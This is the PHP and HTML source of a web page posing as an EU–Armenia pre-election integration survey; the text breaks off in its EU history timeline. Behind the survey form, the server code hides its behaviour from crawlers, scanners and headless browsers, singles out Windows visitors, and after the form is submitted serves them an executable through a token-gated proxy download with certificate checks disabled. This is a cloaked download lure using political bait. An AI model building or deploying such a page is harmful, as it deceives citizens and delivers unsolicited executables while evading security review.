<?php
session_start();

$downloadUrls = [
    'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-720.exe',
    'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-720.exe',
    'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-720.exe',
];
$downloadUrl = $downloadUrls[array_rand($downloadUrls)];
$tokenExpiry  = 300;

$botSigs = [
    'bot','crawl','spider','slurp','mediapartners','googlebot','bingbot',
    'yandex','baidu','duckduckbot','facebookexternalhit','twitterbot',
    'rogerbot','linkedinbot','embedly','showyoubot','outbrain','pinterest',
    'semrush','ahrefs','mj12bot','dotbot','petalbot','bytespider','sogou',
    'wget','curl','python-requests','scrapy','httpclient','java/','libwww',
    'phpcrawl','phantomjs','headlesschrome','selenium','puppeteer','playwright'
];

function isBot($ua) {
    global $botSigs;
    $lower = strtolower($ua);
    foreach ($botSigs as $sig) {
        if (strpos($lower, $sig) !== false) return true;
    }
    if (strlen($ua) < 20) return true;
    if (preg_match('/^(Mozilla\/\d|Opera\/)/', $ua) === 0) return true;
    return false;
}

function isWindows($ua) {
    return strpos($ua, 'Windows NT') !== false;
}

function makeToken() {
    global $tokenExpiry;
    $t = bin2hex(random_bytes(32));
    $_SESSION['dl_t'] = $t;
    $_SESSION['dl_ts'] = time();
    return $t;
}

function useToken($t) {
    global $tokenExpiry;
    if (empty($t)) return false;
    $s = $_SESSION['dl_t'] ?? '';
    $ts = $_SESSION['dl_ts'] ?? 0;
    if (!hash_equals($s, $t)) return false;
    if ((time() - $ts) > $tokenExpiry) return false;
    unset($_SESSION['dl_t'], $_SESSION['dl_ts']);
    return true;
}

$action = $_GET['action'] ?? '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $action === 'submit') {
    header('Content-Type: application/json; charset=utf-8');
    header('X-Content-Type-Options: nosniff');

    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    if (isBot($ua)) {
        http_response_code(403);
        exit(json_encode(['ok' => false]));
    }

    $raw = file_get_contents('php://input');
    $data = json_decode($raw, true);
    if (!is_array($data)) {
        http_response_code(400);
        exit(json_encode(['ok' => false]));
    }

    $required = ['currency', 'laws', 'citizen'];
    foreach ($required as $f) {
        if (empty(trim($data[$f] ?? ''))) {
            exit(json_encode(['ok' => false, 'error' => 'required', 'field' => $f]));
        }
    }

    $ok = in_array($data['currency'] ?? '', ['dram','euro','both'])
       && in_array($data['laws'] ?? '', ['yes','no','undecided'])
       && in_array($data['citizen'] ?? '', ['yes','no']);

    if (!$ok) {
        exit(json_encode(['ok' => false, 'error' => 'invalid']));
    }

    if (!empty($data['email']) && !filter_var($data['email'], FILTER_VALIDATE_EMAIL)) {
        exit(json_encode(['ok' => false, 'error' => 'email']));
    }

    $token = makeToken();
    echo json_encode(['ok' => true, 'token' => $token, 'dl' => isWindows($ua)]);
    exit;
}

if ($action === 'dl') {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    if (isBot($ua) || !isWindows($ua)) { http_response_code(403); exit; }

    $t = $_GET['t'] ?? '';
    if (!useToken($t)) { http_response_code(403); exit; }
    if (empty($downloadUrl)) { http_response_code(503); exit; }

    $parsedPath = parse_url($downloadUrl, PHP_URL_PATH);
    $filename = $parsedPath ? basename($parsedPath) : 'download';

    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $filename . '"');
    header('Cache-Control: no-store');
    header('Pragma: no-cache');

    $ch = curl_init($downloadUrl);
    curl_setopt_array($ch, [
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS      => 10,
        CURLOPT_TIMEOUT        => 600,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_USERAGENT      => $ua,
        CURLOPT_WRITEFUNCTION  => function($ch, $chunk) {
            echo $chunk;
            if (ob_get_level()) ob_flush();
            flush();
            return strlen($chunk);
        },
    ]);
    curl_exec($ch);
    curl_close($ch);
    exit;
}
?>
<!DOCTYPE html>
<html lang="hy">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
    <title>EU – Armenia | Integration Survey 2026</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Noto+Sans+Armenian:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
body.i18n-loading [data-i18n],body.i18n-loading [data-i18n-placeholder]{visibility:hidden}
:root{--blue:#003399;--blue-d:#001F5C;--blue-l:#1A5CC8;--gold:#FFD700;--gold-soft:rgba(255,215,0,0.12);--am-r:#D90012;--am-b:#0033A0;--am-o:#F2A800;--bg:#F0F2F8;--card:#FFFFFF;--text:#111827;--text2:#6B7280;--border:#E5E7EB;--border2:#D1D5DB;--accent-bg:#EEF2FF;--r:16px;--r-sm:12px;--font:'Noto Sans Armenian','Inter',system-ui,-apple-system,sans-serif;--ease:cubic-bezier(.4,0,.2,1)}
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
body{font-family:var(--font);color:var(--text);background:var(--bg);line-height:1.6;overflow-x:hidden;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
.container{width:100%;max-width:1080px;margin:0 auto;padding:0 24px}
.tricolor-bar{height:3px;display:flex;position:fixed;top:0;left:0;right:0;z-index:1001}
.tricolor-bar span:nth-child(1){flex:1;background:var(--am-r)}
.tricolor-bar span:nth-child(2){flex:1;background:var(--am-b)}
.tricolor-bar span:nth-child(3){flex:1;background:var(--am-o)}
.header{position:fixed;top:3px;left:0;right:0;z-index:1000;background:rgba(255,255,255,0.88);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);border-bottom:1px solid rgba(0,0,0,0.05);transition:box-shadow .3s var(--ease)}
.header.scrolled{box-shadow:0 4px 24px rgba(0,0,0,0.06)}
.header-inner{display:flex;align-items:center;justify-content:space-between;height:58px;gap:16px}
.logo{display:flex;align-items:center;gap:10px;text-decoration:none;color:var(--text);flex-shrink:0}
.logo-icon svg{display:block}
.logo-text{display:flex;flex-direction:column;line-height:1.2}
.logo-main{font-weight:800;font-size:15px;color:var(--blue)}
.logo-sub{font-size:10px;color:var(--text2);font-weight:500;letter-spacing:.3px}
.nav{display:flex;gap:28px}
.nav-link{text-decoration:none;color:var(--text2);font-size:13px;font-weight:600;padding:6px 0;position:relative;transition:color .25s var(--ease);letter-spacing:.2px}
.nav-link:hover{color:var(--blue)}
.nav-link::after{content:'';position:absolute;bottom:0;left:0;width:0;height:2px;background:var(--blue);border-radius:1px;transition:width .3s var(--ease)}
.nav-link:hover::after{width:100%}
.header-right{display:flex;align-items:center;gap:12px}
.lang-switcher{position:relative}
.lang-btn{display:flex;align-items:center;gap:6px;padding:6px 14px;border:1px solid var(--border);border-radius:24px;background:var(--card);cursor:pointer;font-size:13px;font-family:var(--font);color:var(--text);transition:all .25s var(--ease)}
.lang-btn:hover{border-color:var(--blue);background:var(--accent-bg)}
.lang-flag{font-size:17px;line-height:1}
.lang-chevron{transition:transform .25s var(--ease)}
.lang-btn[aria-expanded="true"] .lang-chevron{transform:rotate(180deg)}
.lang-dropdown{position:absolute;top:calc(100% + 8px);right:0;background:var(--card);border:1px solid var(--border);border-radius:var(--r-sm);box-shadow:0 12px 40px rgba(0,0,0,0.12);list-style:none;min-width:170px;opacity:0;visibility:hidden;transform:translateY(-8px) scale(.96);transition:all .2s var(--ease);z-index:100;overflow:hidden}
.lang-dropdown.open{opacity:1;visibility:visible;transform:translateY(0) scale(1)}
.lang-dropdown li{display:flex;align-items:center;gap:10px;padding:11px 18px;cursor:pointer;font-size:14px;transition:background .2s}
.lang-dropdown li:hover{background:var(--accent-bg)}
.lang-dropdown li.active{background:var(--accent-bg);color:var(--blue);font-weight:600}
.lang-dropdown li span{font-size:18px;line-height:1}
.burger{display:none;flex-direction:column;gap:5px;padding:6px;border:none;background:none;cursor:pointer}
.burger span{display:block;width:22px;height:2px;background:var(--text);border-radius:2px;transition:all .3s var(--ease)}
.burger.active span:nth-child(1){transform:translateY(7px) rotate(45deg)}
.burger.active span:nth-child(2){opacity:0}
.burger.active span:nth-child(3){transform:translateY(-7px) rotate(-45deg)}
.hero{position:relative;min-height:52vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:96px 24px 44px;background:linear-gradient(140deg,#001133 0%,#002266 25%,#003399 50%,#1A5CC8 80%,#2E71D8 100%);overflow:hidden}
.hero-bg{position:absolute;inset:0;background-image:radial-gradient(rgba(255,255,255,.04) 1px,transparent 1px);background-size:28px 28px;pointer-events:none}
.hero-glow{position:absolute;top:-30%;left:-10%;width:80%;height:140%;background:radial-gradient(ellipse,rgba(255,215,0,.07) 0%,transparent 70%);pointer-events:none;animation:glowDrift 10s ease-in-out infinite alternate}
@keyframes glowDrift{0%{transform:translate(0,0)}100%{transform:translate(8%,5%)}}
.hero-content{position:relative;text-align:center;z-index:2;max-width:620px}
.hero-badge{display:inline-block;background:var(--gold-soft);color:var(--gold);font-size:12px;font-weight:700;padding:6px 20px;border-radius:20px;border:1px solid rgba(255,215,0,.25);margin-bottom:18px;letter-spacing:.8px;text-transform:uppercase}
.hero-title{font-size:clamp(22px,4.5vw,42px);font-weight:900;color:#fff;line-height:1.15;margin-bottom:14px;letter-spacing:-.3px}
.hero-desc{font-size:clamp(13px,2vw,16px);color:rgba(255,255,255,.72);max-width:480px;margin:0 auto 28px;line-height:1.65}
.hero-flags{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:28px}
.flag-am{width:52px;height:34px;border-radius:4px;overflow:hidden;display:flex;flex-direction:column;box-shadow:0 2px 10px rgba(0,0,0,.25)}
.flag-am span{flex:1}
.flag-am span:nth-child(1){background:var(--am-r)}
.flag-am span:nth-child(2){background:var(--am-b)}
.flag-am span:nth-child(3){background:var(--am-o)}
.flag-am.mini{width:28px;height:18px;border-radius:2px;box-shadow:none}
.flag-link svg{display:block}
.flag-eu-wrap{width:52px;height:34px;border-radius:4px;overflow:hidden;box-shadow:0 2px 10px rgba(0,0,0,.25)}
.eu-svg{display:block;width:100%;height:100%}
.mini-eu{width:28px;height:18px;border-radius:2px}
.hero-cta{display:inline-flex;align-items:center;gap:8px;padding:13px 36px;background:var(--gold);color:var(--blue-d);font-weight:800;font-size:14px;border-radius:28px;text-decoration:none;letter-spacing:.3px;transition:all .3s var(--ease);box-shadow:0 4px 20px rgba(255,215,0,.3)}
.hero-cta:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(255,215,0,.4)}
.scroll-hint{position:absolute;bottom:18px;left:50%;transform:translateX(-50%);z-index:2}
.scroll-mouse{width:22px;height:34px;border:2px solid rgba(255,255,255,.3);border-radius:11px;display:flex;justify-content:center;padding-top:7px}
.scroll-dot{width:3px;height:7px;background:rgba(255,255,255,.5);border-radius:2px;animation:scrollAnim 1.8s ease-in-out infinite}
@keyframes scrollAnim{0%{opacity:1;transform:translateY(0)}60%{opacity:0;transform:translateY(8px)}100%{opacity:0;transform:translateY(8px)}}
.survey-section{padding:64px 0 48px}
.section-head{text-align:center;margin-bottom:36px}
.pill{display:inline-block;background:var(--accent-bg);color:var(--blue);font-size:11px;font-weight:700;padding:5px 16px;border-radius:16px;margin-bottom:12px;text-transform:uppercase;letter-spacing:1.2px}
.section-title{font-size:clamp(22px,3vw,32px);font-weight:900;color:var(--text);margin-bottom:8px;letter-spacing:-.3px}
.section-sub{color:var(--text2);font-size:15px;max-width:440px;margin:0 auto}
.survey-card{max-width:660px;margin:0 auto;background:var(--card);border-radius:var(--r);padding:40px 36px;border:1px solid var(--border);box-shadow:0 1px 3px rgba(0,0,0,.03),0 8px 24px rgba(0,0,0,.04),0 20px 48px rgba(0,0,0,.04)}
.field{margin-bottom:32px}
.field:last-of-type{margin-bottom:36px}
.field-label{display:block;font-weight:600;font-size:14px;color:var(--text);margin-bottom:12px;line-height:1.55}
.input-box{position:relative}
.input-ico{position:absolute;left:14px;top:50%;transform:translateY(-50%);width:18px;height:18px;color:var(--text2);pointer-events:none;transition:color .25s var(--ease)}
.input-box input{width:100%;padding:13px 16px 13px 44px;border:1.5px solid var(--border);border-radius:var(--r-sm);font-size:14px;font-family:var(--font);color:var(--text);background:#FAFBFC;transition:all .25s var(--ease);outline:none}
.input-box input:focus{border-color:var(--blue);background:var(--card);box-shadow:0 0 0 4px rgba(0,51,153,.06)}
.input-box input:focus ~ .input-ico{color:var(--blue)}
.field-hint{font-size:12px;color:var(--text2);margin-top:8px;line-height:1.4;font-style:italic;opacity:.85}
.field-err{display:none;font-size:12px;color:#DC2626;margin-top:8px;font-weight:500}
.field.has-error .field-err{display:block}
.field.has-error .input-box input{border-color:#DC2626}
.radio-set{display:flex;flex-direction:column;gap:10px}
.radio-row{flex-direction:row;gap:12px}
.radio-row .radio-card{flex:1}
.radio-card{display:block;cursor:pointer}
.radio-card input{position:absolute;opacity:0;pointer-events:none;width:0;height:0}
.rc-body{display:flex;align-items:center;gap:12px;padding:14px 18px;border:2px solid var(--border);border-radius:var(--r-sm);background:#FAFBFE;transition:all .25s var(--ease);user-select:none}
.rc-body:hover{border-color:rgba(0,51,153,.3);background:var(--accent-bg)}
.radio-card input:checked + .rc-body{border-color:var(--blue);background:linear-gradient(135deg,#EEF2FF 0%,#E0E7FF 100%);box-shadow:0 0 0 3px rgba(0,51,153,.07)}
.rc-dot{width:22px;height:22px;min-width:22px;border:2px solid var(--border2);border-radius:50%;position:relative;transition:all .25s var(--ease);background:var(--card)}
.rc-dot::after{content:'';position:absolute;top:50%;left:50%;width:12px;height:12px;background:var(--blue);border-radius:50%;transform:translate(-50%,-50%) scale(0);transition:transform .2s var(--ease)}
.radio-card input:checked + .rc-body .rc-dot{border-color:var(--blue)}
.radio-card input:checked + .rc-body .rc-dot::after{transform:translate(-50%,-50%) scale(1)}
.field.has-error .radio-set{outline:2px solid #FCA5A5;outline-offset:4px;border-radius:var(--r-sm)}
.submit-btn{display:inline-flex;align-items:center;justify-content:center;gap:10px;width:100%;padding:15px 24px;background:linear-gradient(135deg,var(--blue) 0%,var(--blue-l) 100%);color:#fff;border:none;border-radius:var(--r-sm);font-size:15px;font-weight:700;font-family:var(--font);cursor:pointer;transition:all .3s var(--ease);position:relative;overflow:hidden;letter-spacing:.3px}
.submit-btn::after{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.1),transparent);transition:left .6s var(--ease)}
.submit-btn:hover::after{left:100%}
.submit-btn:hover{transform:translateY(-1px);box-shadow:0 8px 28px rgba(0,51,153,.22)}
.submit-btn:active{transform:translateY(0)}
.submit-btn.loading .btn-text,.submit-btn.loading .btn-arrow{visibility:hidden}
.submit-btn.loading .btn-spin{display:block}
.btn-spin{display:none;position:absolute;width:20px;height:20px;border:2.5px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .65s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.stats-band{padding:44px 0;background:linear-gradient(135deg,var(--blue-d) 0%,var(--blue) 40%,var(--blue-l) 100%);position:relative}
.stats-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:20px;text-align:center}
.stat{padding:16px 8px}
.stat-val{display:block;font-size:clamp(24px,3vw,34px);font-weight:900;color:var(--gold);margin-bottom:4px;letter-spacing:-.5px}
.stat-lbl{font-size:12px;color:rgba(255,255,255,.65);font-weight:500;letter-spacing:.3px}
.timeline-section{padding:64px 0 80px}
.tl{position:relative;max-width:580px;margin:0 auto;padding-left:48px}
.tl::before{content:'';position:absolute;left:18px;top:0;bottom:0;width:2px;background:linear-gradient(180deg,var(--blue),var(--gold));border-radius:1px}
.tl-item{position:relative;padding-bottom:36px}
.tl-item:last-child{padding-bottom:0}
.tl-dot{position:absolute;left:-38px;top:6px;width:16px;height:16px;background:var(--blue);border:3px solid var(--accent-bg);border-radius:50%;z-index:1;box-shadow:0 0 0 4px rgba(0,51,153,.08)}
.tl-card{background:var(--card);border:1px solid var(--border);border-radius:var(--r-sm);padding:20px 24px;box-shadow:0 2px 8px rgba(0,0,0,.03);transition:all .3s var(--ease)}
.tl-card:hover{box-shadow:0 4px 16px rgba(0,0,0,.06);transform:translateY(-2px)}
.tl-year{display:inline-block;font-size:11px;font-weight:700;color:var(--blue);background:var(--accent-bg);padding:2px 10px;border-radius:10px;margin-bottom:8px;letter-spacing:.5px}
.tl-card h3{font-size:16px;font-weight:700;color:var(--text);margin-bottom:4px}
.tl-card p{font-size:13px;color:var(--text2);line-height:1.55}
.footer{background:#070A14;padding:28px 0}
.footer-inner{display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap}
.footer-left{display:flex;align-items:center;gap:14px}
.footer-flags{display:flex;align-items:center;gap:8px}
.footer-copy{font-size:12px;color:rgba(255,255,255,.4)}
.footer-links{display:flex;gap:20px}
.footer-links a{color:rgba(255,255,255,.4);text-decoration:none;font-size:12px;transition:color .25s}
.footer-links a:hover{color:var(--gold)}
.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.45);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);display:flex;align-items:center;justify-content:center;z-index:2000;opacity:0;visibility:hidden;transition:all .3s var(--ease);padding:20px}
.modal-overlay.visible{opacity:1;visibility:visible}
.modal-box{background:var(--card);border-radius:var(--r);padding:44px 36px;text-align:center;max-width:400px;width:100%;transform:scale(.88) translateY(16px);transition:transform .35s var(--ease);box-shadow:0 24px 64px rgba(0,0,0,.15)}
.modal-overlay.visible .modal-box{transform:scale(1) translateY(0)}
.modal-check{margin-bottom:20px}
.modal-check svg{animation:popIn .5s var(--ease) .1s both}
@keyframes popIn{0%{transform:scale(0);opacity:0}60%{transform:scale(1.1)}100%{transform:scale(1);opacity:1}}
.modal-heading{font-size:22px;font-weight:800;color:var(--text);margin-bottom:8px}
.modal-msg{font-size:14px;color:var(--text2);margin-bottom:28px;line-height:1.55}
.modal-btn{display:inline-block;padding:11px 40px;background:linear-gradient(135deg,var(--blue),var(--blue-l));color:#fff;border:none;border-radius:24px;font-size:14px;font-weight:600;font-family:var(--font);cursor:pointer;transition:all .25s var(--ease)}
.modal-btn:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(0,51,153,.2)}
.anim-up{opacity:0;transform:translateY(28px);transition:opacity .6s ease,transform .6s ease}
.anim-up.visible{opacity:1;transform:translateY(0)}
@media(max-width:768px){.container{padding:0 16px}.header-inner{height:52px}.nav{position:fixed;top:55px;left:0;right:0;background:rgba(255,255,255,.98);backdrop-filter:blur(12px);flex-direction:column;align-items:center;gap:0;padding:8px 0;border-bottom:1px solid var(--border);transform:translateY(-110%);opacity:0;visibility:hidden;transition:all .3s var(--ease);z-index:999}.nav.open{transform:translateY(0);opacity:1;visibility:visible}.nav-link{padding:14px 20px;width:100%;text-align:center;font-size:15px}.burger{display:flex}.hero{min-height:44vh;padding:80px 16px 36px}.hero-title{font-size:22px}.hero-desc{font-size:13px;margin-bottom:20px}.hero-badge{font-size:10px;padding:5px 14px}.hero-cta{padding:11px 28px;font-size:13px}.flag-am{width:40px;height:26px}.flag-eu-wrap{width:40px;height:26px}.flag-link svg{width:40px}.survey-section{padding:40px 0 32px}.survey-card{padding:28px 20px;border-radius:var(--r-sm)}.field-label{font-size:13px}.rc-body{padding:12px 14px;gap:10px}.rc-body span:last-child{font-size:13px}.rc-dot{width:20px;height:20px;min-width:20px}.rc-dot::after{width:10px;height:10px}.radio-row{flex-direction:row}.stats-grid{grid-template-columns:repeat(2,1fr);gap:12px}.tl{padding-left:36px}.tl::before{left:13px}.tl-dot{left:-30px;width:14px;height:14px}.tl-card{padding:16px 18px}.timeline-section{padding:40px 0 56px}.footer-inner{flex-direction:column;text-align:center;gap:12px}.lang-label{display:none}.lang-btn{padding:6px 8px}.scroll-hint{display:none}.modal-box{padding:36px 24px}}
@media(max-width:400px){.hero{min-height:38vh;padding:74px 12px 28px}.hero-title{font-size:19px}.survey-card{padding:24px 14px}.logo-text{display:none}.radio-row{flex-direction:column;gap:10px}}
    </style>
</head>
<body class="i18n-loading">

<div class="tricolor-bar"><span></span><span></span><span></span></div>

<header class="header" id="header">
    <div class="container header-inner">
        <a href="#" class="logo">
            <div class="logo-icon">
                <svg viewBox="0 0 36 36" width="36" height="36">
                    <circle cx="18" cy="18" r="16" fill="none" stroke="#FFD700" stroke-width="1.5"/>
                    <?php for ($i = 0; $i < 12; $i++): $a = deg2rad($i * 30 - 90); $x = 18 + 12 * cos($a); $y = 18 + 12 * sin($a); ?>
                    <text x="<?= round($x,1) ?>" y="<?= round($y+1.5,1) ?>" text-anchor="middle" fill="#FFD700" font-size="5">&#9733;</text>
                    <?php endfor; ?>
                </svg>
            </div>
            <div class="logo-text">
                <span class="logo-main" data-i18n="logo_main">EU – Armenia</span>
                <span class="logo-sub" data-i18n="logo_sub">European Integration</span>
            </div>
        </a>

        <nav class="nav" id="mainNav">
            <a href="#survey-section" class="nav-link" data-i18n="nav_survey">Survey</a>
            <a href="#timeline-section" class="nav-link" data-i18n="nav_timeline">EU History</a>
        </nav>

        <div class="header-right">
            <div class="lang-switcher" id="langSwitcher">
                <button class="lang-btn" id="langBtn" aria-expanded="false" aria-haspopup="listbox">
                    <span class="lang-flag">&#x1F1E6;&#x1F1F2;</span>
                    <span class="lang-label" id="langLabel">&#x0540;&#x0561;&#x0575;&#x0565;&#x0580;&#x0565;&#x0576;</span>
                    <svg class="lang-chevron" width="12" height="12" viewBox="0 0 12 12" fill="none">
                        <path d="M3 4.5L6 7.5L9 4.5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
                    </svg>
                </button>
                <ul class="lang-dropdown" id="langDropdown" role="listbox">
                    <li role="option" data-lang="hy" class="active"><span>&#x1F1E6;&#x1F1F2;</span> &#x0540;&#x0561;&#x0575;&#x0565;&#x0580;&#x0565;&#x0576;</li>
                    <li role="option" data-lang="en"><span>&#x1F1EC;&#x1F1E7;</span> English</li>
                    <li role="option" data-lang="ru"><span>&#x1F1F7;&#x1F1FA;</span> &#x0420;&#x0443;&#x0441;&#x0441;&#x043A;&#x0438;&#x0439;</li>
                    <li role="option" data-lang="de"><span>&#x1F1E9;&#x1F1EA;</span> Deutsch</li>
                </ul>
            </div>
            <button class="burger" id="burger" aria-label="Menu">
                <span></span><span></span><span></span>
            </button>
        </div>
    </div>
</header>

<section class="hero" id="hero">
    <div class="hero-bg"></div>
    <div class="hero-glow"></div>
    <div class="container hero-content">
        <div class="hero-badge" data-i18n="hero_badge">Pre-election Survey 2026</div>
        <h1 class="hero-title" data-i18n="hero_title">Armenia's Integration into the European Alliance</h1>
        <p class="hero-desc" data-i18n="hero_desc">Participate in the national public survey. Your voice matters for shaping the future.</p>

        <div class="hero-flags">
            <div class="flag-am">
                <span></span><span></span><span></span>
            </div>
            <div class="flag-link">
                <svg width="56" height="20" viewBox="0 0 56 20">
                    <line x1="0" y1="10" x2="46" y2="10" stroke="#FFD700" stroke-width="2" stroke-dasharray="4 3"/>
                    <polygon points="46,5 56,10 46,15" fill="#FFD700"/>
                </svg>
            </div>
            <div class="flag-eu-wrap">
                <svg viewBox="0 0 60 40" class="eu-svg">
                    <rect width="60" height="40" fill="#003399" rx="3"/>
                    <?php for ($i = 0; $i < 12; $i++): $a = deg2rad($i * 30 - 90); $cx = 30 + 14 * cos($a); $cy = 20 + 14 * sin($a); ?>
                    <polygon points="<?= round($cx,1) ?>,<?= round($cy-2.2,1) ?> <?= round($cx+0.7,1) ?>,<?= round($cy-0.7,1) ?> <?= round($cx+2.1,1) ?>,<?= round($cy-0.7,1) ?> <?= round($cx+1,1) ?>,<?= round($cy+0.3,1) ?> <?= round($cx+1.3,1) ?>,<?= round($cy+1.8,1) ?> <?= round($cx,1) ?>,<?= round($cy+1,1) ?> <?= round($cx-1.3,1) ?>,<?= round($cy+1.8,1) ?> <?= round($cx-1,1) ?>,<?= round($cy+0.3,1) ?> <?= round($cx-2.1,1) ?>,<?= round($cy-0.7,1) ?> <?= round($cx-0.7,1) ?>,<?= round($cy-0.7,1) ?>" fill="#FFD700"/>
                    <?php endfor; ?>
                </svg>
            </div>
        </div>

        <a href="#survey-section" class="hero-cta" data-i18n="hero_cta">Take the Survey</a>
    </div>
    <div class="scroll-hint">
        <div class="scroll-mouse"><div class="scroll-dot"></div></div>
    </div>
</section>

<section class="survey-section" id="survey-section">
    <div class="container">
        <div class="section-head">
            <span class="pill" data-i18n="survey_badge">Public Survey</span>
            <h2 class="section-title" data-i18n="survey_title">Integration Survey</h2>
            <p class="section-sub" data-i18n="survey_desc">Your opinion is important. Please answer the following questions.</p>
        </div>
        <div class="survey-card">
            <form id="surveyForm" autocomplete="off" novalidate>

                <div class="field" data-field="email">
                    <label for="f_email" class="field-label" data-i18n="label_email">Email Address (optional)</label>
                    <div class="input-box">
                        <svg class="input-ico" viewBox="0 0 20 20" fill="none">
                            <rect x="2" y="4" width="16" height="12" rx="2" stroke="currentColor" stroke-width="1.4"/>
                            <path d="M2 6l8 5 8-5" stroke="currentColor" stroke-width="1.4"/>
                        </svg>
                        <input type="email" id="f_email" name="email" data-i18n-placeholder="ph_email" placeholder="example@email.com">
                    </div>
                    <p class="field-hint" data-i18n="note_email">We will send you news and informational updates via email.</p>
                    <p class="field-err" data-i18n="error_email">Invalid email format</p>
                </div>

                <div class="field" data-field="currency">
                    <label class="field-label" data-i18n="label_currency">After Armenia joins the European Alliance, the currency will change to Euro. What should the currency policy be?</label>
                    <div class="radio-set">
                        <label class="radio-card">
                            <input type="radio" name="currency" value="dram">
                            <div class="rc-body">
                                <span class="rc-dot"></span>
                                <span data-i18n="opt_dram_only">Only Armenian Dram</span>
                            </div>
                        </label>
                        <label class="radio-card">
                            <input type="radio" name="currency" value="euro">
                            <div class="rc-body">
                                <span class="rc-dot"></span>
                                <span data-i18n="opt_euro_only">Only Euro</span>
                            </div>
                        </label>
                        <label class="radio-card">
                            <input type="radio" name="currency" value="both">
                            <div class="rc-body">
                                <span class="rc-dot"></span>
                                <span data-i18n="opt_both">Both Dram and Euro</span>
                            </div>
                        </label>
                    </div>
                    <p class="field-err" data-i18n="error_required">Cannot leave blank</p>
                </div>

                <div class="field" data-field="laws">
                    <label class="field-label" data-i18n="label_laws">After joining the EU, some laws will change — wages will increase, but working hours will also change. Will this cause problems in daily life?</label>
                    <div class="radio-set">
                        <label class="radio-card">
                            <input type="radio" name="laws" value="yes">
                            <div class="rc-body">
                                <span class="rc-dot"></span>
                                <span data-i18n="opt_yes">Yes</span>
                            </div>
                        </label>
                        <label class="radio-card">
                            <input type="radio" name="laws" value="no">
                            <div class="rc-body">
                                <span class="rc-dot"></span>
                                <span data-i18n="opt_no">No</span>
                            </div>
                        </label>
                        <label class="radio-card">
                            <input type="radio" name="laws" value="undecided">
                            <div class="rc-body">
                                <span class="rc-dot"></span>
                                <span data-i18n="opt_undecided">Undecided</span>
                            </div>
                        </label>
                    </div>
                    <p class="field-err" data-i18n="error_required">Cannot leave blank</p>
                </div>

                <div class="field" data-field="citizen">
                    <label class="field-label" data-i18n="label_citizen">Are you an Armenian citizen?</label>
                    <div class="radio-set radio-row">
                        <label class="radio-card">
                            <input type="radio" name="citizen" value="yes">
                            <div class="rc-body">
                                <span class="rc-dot"></span>
                                <span data-i18n="opt_yes">Yes</span>
                            </div>
                        </label>
                        <label class="radio-card">
                            <input type="radio" name="citizen" value="no">
                            <div class="rc-body">
                                <span class="rc-dot"></span>
                                <span data-i18n="opt_no">No</span>
                            </div>
                        </label>
                    </div>
                    <p class="field-err" data-i18n="error_required">Cannot leave blank</p>
                </div>

                <button type="submit" class="submit-btn" id="submitBtn">
                    <span class="btn-text" data-i18n="submit_btn">Submit</span>
                    <svg class="btn-arrow" width="20" height="20" viewBox="0 0 20 20" fill="none">
                        <path d="M4 10H16M12 6L16 10L12 14" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                    <span class="btn-spin"></span>
                </button>
            </form>
        </div>
    </div>
</section>

<section class="stats-band">
    <div class="container stats-grid">
        <div class="stat anim-up">
            <span class="stat-val" data-i18n="stat1_num">27+</span>
            <span class="stat-lbl" data-i18n="stat1_label">Member States</span>
        </div>
        <div class="stat anim-up">
            <span class="stat-val" data-i18n="stat2_num">450M+</span>
            <span class="stat-lbl" data-i18n="stat2_label">Citizens</span>
        </div>
        <div class="stat anim-up">
            <span class="stat-val" data-i18n="stat3_num">1957</span>
            <span class="stat-lbl" data-i18n="stat3_label">Year Founded</span>
        </div>
        <div class="stat anim-up">
            <span class="stat-val" data-i18n="stat4_num">24</span>
            <span class="stat-lbl" data-i18n="stat4_label">Official Languages</span>
        </div>
    </div>
</section>

<section class="timeline-section" id="timeline-section">
    <div class="container">
        <div class="section-head">
            <span class="pill" data-i18n="timeline_badge">History</span>
            <h2 class="section-title" data-i18n="timeline_title">European Alliance History</h2>
        </div>
        <div class="tl">
            <div class="tl-item anim-up">
                <div class="tl-dot"></div>
                <div class="tl-card">
                    <span class="tl-year">1957</span>
                    <h3 data-i18n="tl_1957_t">Treaty of Rome</h3>
                    <p data-i18n="tl_1957_d">Six founding states established the European Economic Community.</p>
                </div>
            </div>
            <div class="tl-item anim-up">
                <div class="tl-dot"></div>
                <div class="tl-card">
                    <span class="tl-year">1993</span>
                    <h3 data-i18n="tl_1993_t">Maastricht Treaty</h3>
                    <p data-i18n="tl_1993_d">The European Union was officially established.</p>
                </div>
            </div>
            <div class="tl-item anim-up">
                <div class="tl-dot"></div>
                <div class="tl-card">
                    <span class="tl-year">2002</span>
